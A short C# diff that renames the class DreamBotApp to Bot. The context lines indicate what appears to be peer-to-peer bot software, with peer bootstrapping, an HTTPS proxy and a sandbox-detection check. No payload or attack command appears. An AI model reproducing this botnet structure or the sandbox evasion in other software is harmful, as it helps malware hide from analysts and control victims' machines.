@@ -20,9 +20,9 @@ using MessageType = DreamBot.Network.Protocol.Messages.MessageType;
 
 namespace DreamBot
 {
-    public class DreamBotApp
+    public class Bot
     {
-        private static DreamBotApp _bot;
+        private static Bot _bot;
         public static void Main(string[] args)
         {
             var idbuf = new byte[16];
@@ -58,7 +58,7 @@ namespace DreamBot
             SandboxDetection.CheckIfSandboxed();
 #endif
 
-            _bot = new DreamBotApp(listenPort, id);
+            _bot = new Bot(listenPort, id);
             _bot.Run();
             _bot.Bootstrap(peers);
             var c = Console.ReadKey(true);
@@ -95,7 +95,7 @@ namespace DreamBot
         private readonly HttpsProxyServer _https;
         public static BotIdentifier BotId;
   
-        public DreamBotApp(int port, BotIdentifier id)
+        public Bot(int port, BotIdentifier id)
         {
             BotId = id;
             Logger.Info(0, "DreamBot [id: {0}] listenning on port {1}", BotId, port);
